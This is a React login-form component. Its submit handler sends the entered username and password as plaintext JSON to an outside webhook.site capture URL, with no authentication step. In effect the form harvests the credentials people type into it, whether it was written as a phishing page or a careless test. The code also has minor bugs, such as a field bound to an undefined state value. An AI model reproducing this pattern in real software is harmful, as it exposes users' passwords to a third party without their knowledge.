import React, { Component } from "react";
import Container from "@material-ui/core/Container";
import Typography from "@material-ui/core/Typography";
import TextField from "@material-ui/core/TextField";
import Button from "@material-ui/core/Button";
import Grid from "@material-ui/core/Grid";

class Login extends Component {
  state = {
    username: "",
    password: "",
    result: null
  };
  handleChange = e => {
    this.setState({
      [e.target.name]: e.target.value
    });
  };
  handleSubmit = e => {
    e.preventDefault();
    const url = "https://webhook.site/c190c025-ff83-4dc4-b5a5-4cc7018bb98e";
    const data = {
      username: this.state.username,
      password: this.state.password
    };
    fetch(url, {
      method: "POST",
      mode: "no-cors",
      body: JSON.stringify(data),
      headers: {
        "Content-Type": "application/json",
        "Content-type": "application/json"
      }
    })
      .then(res => res.json())
      .catch(error => console.error("Error:", error));
  };
  render() {
    return (
      <React.Fragment>
        <Container fixed>
          <div className="app">
            <Typography align="center" variant="h4" component="h2" gutterBottom>
              Login Form
            </Typography>
            <form
              style={{ "text-align": "center" }}
              onSubmit={this.handleSubmit}
            >
              <Grid container>
                <Grid style={{ margin: "auto" }} justify="center" item xs={3}>
                  <TextField
                    name="username"
                    type="text"
                    id="standard-basic"
                    label="Email or Username"
                    fullWidth="true"
                    onChange={this.handleChange}
                    value={this.state.email}
                  />
                </Grid>
              </Grid>
              <Grid container>
                <Grid
                  style={{ margin: "20px auto" }}
                  justify="center"
                  item
                  xs={3}
                >
                  <TextField
                    name="password"
                    type="password"
                    id="standard-basic"
                    label="Password"
                    fullWidth="true"
                    onChange={this.handleChange}
                    value={this.state.password}
                  />
                </Grid>
              </Grid>
              <Button
                size="medium"
                type="submit"
                variant="contained"
                color="primary"
              >
                Submit
              </Button>
            </form>
          </div>
        </Container>
      </React.Fragment>
    );
  }
}

export default Login;
